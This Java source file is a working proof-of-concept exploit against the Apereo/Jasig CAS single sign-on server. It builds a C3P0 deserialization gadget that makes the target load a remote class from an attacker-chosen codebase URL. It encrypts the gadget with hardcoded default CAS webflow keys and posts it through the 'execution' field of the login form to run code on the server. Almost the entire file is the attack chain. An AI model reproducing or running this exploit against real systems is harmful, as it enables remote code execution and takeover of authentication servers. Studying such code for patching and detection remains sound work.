package com.threedr3am.bug.cas;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.threedr3am.bug.common.utils.HttpUtil;
import com.threedr3am.bug.common.utils.Reflections;
import com.unboundid.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;
import java.security.KeyStore;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import org.cryptacular.bean.BufferedBlockCipherBean;
import org.cryptacular.bean.CipherBean;
import org.cryptacular.bean.KeyStoreFactoryBean;
import org.cryptacular.generator.sp80038a.RBGNonce;
import org.cryptacular.io.URLResource;
import org.cryptacular.spec.BufferedBlockCipherSpec;
import org.jasig.cas.util.BinaryCipherExecutor;
import org.jasig.cas.web.flow.CasWebflowCipherBean;
import org.jasig.spring.webflow.plugin.Transcoder;

/**
 * @author threedr3am
 */
public class AttackDemo {

  public static void main(String[] args) throws Exception {
    WebflowCipherExecutor webflowCipherExecutor = new WebflowCipherExecutor("BjhXuZMDpvFqaYQl", "LQrGyGjxwnk-0fLEC4mjR1q_mX9CvPLyt9Siy_GfG592WgZc97wWOjifuslNbUdhU9h5dwac1n8nGoZh8yo2Dw", "AES");
    CasWebflowCipherBean casWebflowCipherBean = new CasWebflowCipherBean(webflowCipherExecutor);
    byte[] bytes = new EncryptedTranscoder(casWebflowCipherBean).encode(makeGadget("http://127.0.0.1:80:Calc"));
    String base64 = Base64.encode(bytes);
    String html = HttpUtil.get("http://localhost:8080/cas/login");
    Matcher matcher = Pattern.compile("name=\"execution\" value=\"(.+?)\"").matcher(html);
    if (matcher.find()) {
      String execution = matcher.group(1);
      if (execution != null && execution.length() > 0) {
        String uuid = execution.split("_")[0];
        System.out.println(HttpUtil.post("http://localhost:8080/cas/login", "execution=" + uuid + "_" + URLEncoder.encode(base64)));
      }
    }
  }

  public static Object makeGadget(String command) throws Exception {
    int sep = command.lastIndexOf(':');
    if ( sep < 0 ) {
      throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
    }

    String url = command.substring(0, sep);
    String className = command.substring(sep + 1);

    PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
    Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
    return b;
  }

  private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

    private String className;
    private String url;

    public PoolSource ( String className, String url ) {
      this.className = className;
      this.url = url;
    }

    public Reference getReference () throws NamingException {
      return new Reference("exploit", this.className, this.url);
    }

    public PrintWriter getLogWriter () throws SQLException {return null;}
    public void setLogWriter ( PrintWriter out ) throws SQLException {}
    public void setLoginTimeout ( int seconds ) throws SQLException {}
    public int getLoginTimeout () throws SQLException {return 0;}
    public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
    public PooledConnection getPooledConnection () throws SQLException {return null;}
    public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

  }


  public static class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
      BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
      bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
      bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
      bufferedBlockCipherBean.setKeyAlias("aes128");
      bufferedBlockCipherBean.setKeyPassword("changeit");
      bufferedBlockCipherBean.setNonce(new RBGNonce());
      this.setCipherBean(bufferedBlockCipherBean);
    }

    public EncryptedTranscoder(CipherBean cipherBean) throws IOException {
      this.setCipherBean(cipherBean);
    }

    public void setCompression(boolean compression) {
      this.compression = compression;
    }

    protected void setCipherBean(CipherBean cipherBean) {
      this.cipherBean = cipherBean;
    }

    public byte[] encode(Object o) throws IOException {
      if (o == null) {
        return new byte[0];
      } else {
        ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
        ObjectOutputStream out = null;

        try {
          if (this.compression) {
            out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
          } else {
            out = new ObjectOutputStream(outBuffer);
          }

          out.writeObject(o);
        } finally {
          if (out != null) {
            out.close();
          }

        }

        try {
          return this.cipherBean.encrypt(outBuffer.toByteArray());
        } catch (Exception var7) {
          throw new IOException("Encryption error", var7);
        }
      }
    }

    public Object decode(byte[] encoded) throws IOException {
      byte[] data;
      try {
        data = this.cipherBean.decrypt(encoded);
      } catch (Exception var11) {
        throw new IOException("Decryption error", var11);
      }

      ByteArrayInputStream inBuffer = new ByteArrayInputStream(data);
      ObjectInputStream in = null;

      Object var5;
      try {
        if (this.compression) {
          in = new ObjectInputStream(new GZIPInputStream(inBuffer));
        } else {
          in = new ObjectInputStream(inBuffer);
        }

        var5 = in.readObject();
      } catch (ClassNotFoundException var10) {
        throw new IOException("Deserialization error", var10);
      } finally {
        if (in != null) {
          in.close();
        }

      }

      return var5;
    }

    protected KeyStore createAndPrepareKeyStore() {
      KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean();
      URL u = this.getClass().getResource("/etc/keystore.jceks");
      ksFactory.setResource(new URLResource(u));
      ksFactory.setType("JCEKS");
      ksFactory.setPassword("changeit");
      return ksFactory.newInstance();
    }
  }

  public static class WebflowCipherExecutor extends BinaryCipherExecutor {

    public WebflowCipherExecutor(String secretKeyEncryption, String secretKeySigning,
        String secretKeyAlg) {
      super(secretKeyEncryption, secretKeySigning);
      this.setSecretKeyAlgorithm(secretKeyAlg);
    }
  }
}
